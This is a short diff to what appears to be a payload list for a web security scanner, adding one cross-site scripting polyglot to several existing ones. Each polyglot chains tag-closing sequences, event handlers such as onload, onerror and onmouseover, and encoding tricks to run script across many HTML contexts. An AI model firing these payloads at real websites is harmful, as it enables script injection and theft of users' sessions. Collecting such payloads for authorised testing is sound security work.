@@ -1,4 +1,5 @@
  '''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk={callback} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd={callback}//>\x3e'''
+ '''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
 jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 jaVas%0Cript:/*--></tit%0le></st%0yle></text%0area></scri%0pt></xm%0p><sv%0g/on%0load='+/"/+/onmou%0seover=1/+/[*/[]/+al%0ert(1)//'>
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
